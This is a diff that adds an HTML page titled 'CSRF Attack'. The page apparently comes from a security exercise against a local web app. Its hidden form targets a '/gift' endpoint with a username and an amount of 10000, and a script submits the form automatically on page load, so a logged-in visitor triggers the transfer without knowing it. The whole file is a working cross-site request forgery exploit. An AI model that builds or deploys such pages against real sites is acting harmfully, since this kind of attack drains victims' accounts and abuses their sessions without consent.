@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF Attack</title>
+    </head>
+    <body>
+        <!-- This form will be automatically submitted to execute the CSRF attack -->
+        <form id="csrfForm" action="http://127.0.0.1:8000/gift/0" method="get">
+            <input type="hidden" name="username" value="test2">
+            <input type="hidden" name="amount" value="10000">
+        </form>
+
+        <script>
+            // Automatically submit the form as soon as the page loads
+            window.addEventListener('load', function() {
+                document.getElementById('csrfForm').submit();
+            });
+        </script>
+    </body>
+</html>
